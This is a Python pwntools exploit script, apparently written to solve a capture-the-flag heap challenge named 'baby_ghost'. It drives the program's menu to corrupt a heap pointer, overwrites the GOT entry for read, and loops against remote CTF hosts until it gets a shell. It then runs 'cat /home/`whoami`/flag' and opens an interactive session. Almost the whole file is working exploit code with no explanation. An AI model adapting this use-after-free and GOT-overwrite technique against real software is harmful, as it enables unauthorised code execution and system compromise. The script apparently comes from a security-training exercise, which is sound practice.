#!/usr/bin/env python
from pwn import *

# AD{UAF_15_fun!!!!!}

context.arch = 'amd64'

e , l = ELF( './baby_ghost' ) , ELF( './libc.so.6' )

host , port = 'ctf.yuawn.idv.tw' , 10111
host , port = 'ctf.adl.csie.ncu.edu.tw' , 11012
#y = remote( host , port )


def add_h( name , dsc ):
        y.sendafter( 'ice:' , '1' )
        y.sendafter( ':' , dsc )
        y.sendafter( ':' , name )

def add_g( name , size , dsc ):
        y.sendafter( 'ice:' , '3' )
        y.sendafter( ':' , dsc )
        y.sendafter( ':' , str( size ) )
        if size > 0:
                y.sendafter( ':' , name )

def sho():
        y.sendafter( 'ice:' , '5' )

def mod_h( idx , name ):
        y.sendafter( 'ice:' , '2' )
        y.sendafter( 'x:' , str( idx ) )
        y.sendafter( ':' , name )

def mod_g( name ):
        y.sendafter( 'ice:' , '4' )
        y.sendafter( ':' , name )


r = ELF('./libc.so.6.remote')
print 'read ' + hex( r.symbols['read'] )
print 'malloc ' + hex( r.symbols['malloc'] )
print 'free ' + hex( r.symbols['free'] )
print 'free ' + hex( r.symbols['free'] )



while True:
        y = remote( host , port )

        add_h( 'a' * 0x18 + p64( e.got['read'] ) , 'a' )
        mod_h( 0 , '\x00' )
        add_g( 'a' , -1 , 'a' )
        #mod_g( '\x74\x32' )
        mod_g( '\x97\x38' )

        y.sendafter( 'ice:' , '2' )
        y.sendafter( 'x:' , '0' )
        #sho()
        #y.sendafter( 'ice:' , '7' )
        #y.sendafter( 'ice:' , '1' )
        #y.sendafter( 'x:' , '0' )

        #y.sendafter( 'ice:' , '1' )
        #y.recvuntil(':')

        sleep(1)
        try:
                y.sendline( 'cat /home/`whoami`/flag' )
                print y.recvline()
                y.interactive()
                break

        except:
                y.close()
